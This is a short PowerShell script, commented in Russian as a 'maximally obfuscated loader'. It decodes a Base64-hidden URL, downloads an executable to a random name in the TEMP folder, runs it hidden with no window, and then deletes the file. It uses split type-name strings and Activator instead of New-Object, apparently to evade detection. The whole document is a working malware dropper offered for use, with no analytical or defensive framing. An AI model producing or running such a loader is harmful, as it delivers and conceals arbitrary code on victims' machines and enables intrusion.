# Максимально обфусцированный загрузчик
$e='aHR0cHM6Ly91LnRvL1pIWjNJZw=='
$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e))

# Разбиваем путь на части
$t=$env:TEMP
$g=[guid]::NewGuid()
$n=$g.ToString().Substring(0,8)
$p="$t\$n.exe"

# Используем [Activator] вместо New-Object
$wt=[Type]('{1}{0}'-f 't.WebClient','Sys'+'em.Ne')
$c=[Activator]::CreateInstance($wt)
$c.DownloadFile($u,$p)

# Запуск через ProcessStartInfo
$i=New-Object Diagnostics.ProcessStartInfo
$i.FileName=$p
$i.WindowStyle='Hidden'
$i.CreateNoWindow=$true
[Diagnostics.Process]::Start($i)

# Очистка
Start-Sleep 3
Remove-Item $p -Force -ErrorAction SilentlyContinue